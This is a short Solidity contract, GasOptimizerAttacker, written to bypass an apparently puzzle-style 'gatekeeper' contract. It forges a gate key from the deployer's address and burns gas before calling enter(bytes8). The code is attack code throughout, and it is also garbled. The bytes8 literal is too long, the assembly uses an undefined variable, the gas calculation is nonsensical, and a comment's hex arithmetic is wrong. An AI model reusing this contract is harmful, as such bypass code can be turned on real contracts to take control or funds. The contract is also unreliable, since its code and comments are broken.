pragma solidity ^0.8.0;

contract GasOptimizerAttacker {
    address public owner;
    address immutable gatekeeper;
    bytes8 gateKey;

    constructor(address _gatekeeper) {
        owner = msg.sender;
        gatekeeper = _gatekeeper;
        
        // Construct gateKey: 32 bits = 16 bits of tx.origin (last two bytes)
        // First two bytes can be non-zero, third and fourth zero, last two bytes from tx.origin
        // Deployer's address is 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, last two bytes 0x22 and 0x66: hex('2266') = 8826 in hex, which is 0x2266
        gateKey = bytes8(0x1234000000000000000000002266);
    }

    function attack() public {
        // Calculate the gas to burn
        uint256 gasToBurn;
        assembly {
            gasToBurn := sub(8191, gas())
            gasToBurn := mul(gasToBurn, 0x10000000000000000)
            // Calculate the mod
            gasToBurn := sub(8191, gasToBurn % 8191)
            gasToBurn := mod(gasToBurn, 8191)
        }

        // Burn the calculated gas
        for (uint256 i = 0; i < gasToBurn; i++) {
            assembly {
                pop(data) // Data is 0, this consumes gas
            }
        }

        // Now call enter with the gateKey
        (bool success,) = gatekeeper.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
        require(success, "Call to enter failed");
    }
}